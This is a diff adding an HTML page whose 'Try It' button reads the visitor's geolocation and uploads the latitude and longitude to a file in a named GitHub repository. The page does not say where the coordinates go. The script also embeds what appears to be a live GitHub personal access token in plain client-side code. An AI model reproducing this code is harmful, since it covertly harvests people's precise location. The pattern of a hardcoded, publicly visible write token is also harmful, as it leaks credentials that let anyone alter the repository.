@@ -1,0 +1,41 @@
+<button onclick="getLocation()">Try It</button>
+
+<script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    }
+
+    function showPosition(position) {
+        const lat = position.coords.latitude;
+        const long = position.coords.longitude;
+        const url = 'https://api.github.com/repos/MadaraUchiha775/Coder/contents/location.txt';
+        const token = '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';
+
+        fetch(url, {
+            method: 'PUT',
+            headers: {
+                'Authorization': `token ${token}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                message: 'Update location.txt',
+                content: btoa(`lat: ${lat}\nlong: ${long}\n`),
+                sha: ''
+            })
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to update location.txt');
+            }
+            alert('Data stored successfully');
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred');
+        });
+    }
+</script>
